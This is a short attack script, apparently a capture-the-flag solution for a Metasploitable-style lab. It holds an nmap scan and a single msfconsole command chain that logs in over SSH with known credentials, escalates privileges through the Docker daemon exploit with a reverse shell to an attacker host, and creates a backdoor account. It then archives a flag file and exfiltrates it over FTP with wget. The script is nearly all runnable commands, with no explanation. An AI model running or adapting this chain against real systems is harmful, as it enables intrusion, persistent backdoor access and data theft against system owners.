#This is a long string msfconsole command that executes an end to end attack
nmap -sV -Pn -T5 -sX 10.0.2.10

/usr/bin/msfconsole -q -x "use auxiliary/scanner/ssh/ssh_version;set rhosts 10.0.2.9;run;sleep 30;use auxiliary/scanner/ssh/ssh_login;set rhosts 10.0.2.10;set username boba_fett;set password mandalorian1; run -j;sleep 10;sessions -i 1 -c 'whoami';sleep 10;sessions -i 1 -c 'groups';sleep 10;use exploit/linux/local/docker_daemon_privilege_escalation; set session 1; set payload linux/x86/shell_reverse_tcp; set lhost 10.0.2.8; set lport 4444; exploit -j;sleep 60; sessions -i 2 -c 'whoami';sleep 10;sessions -i 2 -c 'find / -name 10_of_clubs.wav';sleep 10; sessions -i 2 -c 'useradd -g users -s /bin/bash -p $(echo itsatrap | openssl passwd -1 -stdin) adm_ackbar';sleep 5; sessions -i 2 -c 'usermod -a -G docker adm_ackbar'; sleep 5; sessions -i 2 -c 'tar -czf 10_of_clubs.wav.tar.gz /home/artoo_detoo/music/10_of_clubs.wav';sleep 10; sessions -i 2 -c 'mv 10_of_clubs.wav.tar.gz /home/boba_fett/10_of_clubs.wav.tar.gz'; sleep 5; exit -y"

wget --no-passive --ftp-user=boba_fett --ftp-password=mandalorian1 ftp://10.0.2.10/10_of_clubs.wav.tar.gz 

